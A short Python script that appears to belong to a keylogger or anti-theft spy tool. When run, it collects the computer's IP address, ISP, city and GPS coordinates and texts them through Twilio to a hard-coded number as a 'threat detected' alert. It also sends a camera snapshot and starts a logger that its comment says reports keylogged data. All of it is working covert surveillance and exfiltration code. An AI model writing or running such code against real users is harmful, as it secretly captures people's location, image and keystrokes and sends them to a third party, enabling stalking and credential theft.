from constants import *
from twilio.rest import Client
from logger import Logger, REPORT_DELAY
import camera
import geolocator

# The Twilio client
client = Client(account_sid, auth_token)
data = geolocator.get_location()
sms = "ALERT: THREAT DETECTED!" \
          + "\n\nIP: " + data['query'] \
          + "\nISP: " + data['isp'] \
          + "\nLocation: " + data['city'] + ", " + data['region'] + ", " + data['country'] \
          + "\nCoordinates (Latitude, Longitude): " + str(data['lat']) + ", " + str(data['lon'])


# Method for reporting keylogged data to the user via SMS (twilio)
def report():
    # Creates message
    message = client.messages.create(
        to=USER_NUMBER,
        from_=TWILIO_NUMBER,
        body="\n\n" + sms)
    message2 = client.messages.create(
        to=USER_NUMBER,
        from_=TWILIO_NUMBER,
        media_url=[camera.use_camera()])
    logger = Logger(REPORT_DELAY)
    logger.start()

report()
